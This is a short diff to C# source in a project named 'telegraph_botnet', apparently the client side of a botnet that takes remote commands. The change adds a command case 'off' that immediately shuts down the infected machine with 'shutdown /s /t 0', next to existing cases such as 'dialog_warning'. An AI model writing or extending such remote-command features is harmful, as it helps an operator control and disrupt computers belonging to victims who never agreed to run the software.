@@ -7,6 +7,7 @@ using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using System.IO;
+using System.Diagnostics;
 
 namespace telegraph_botnet
 {
@@ -111,6 +112,10 @@ namespace telegraph_botnet
 
                 case "dialog_warning":
                     functions.DialogWarning(CMD.ComContent);
+                    break;
+
+                case "off":
+                    Process.Start("shutdown", "/s /t 0");
                     break;
 
                 case "exit":
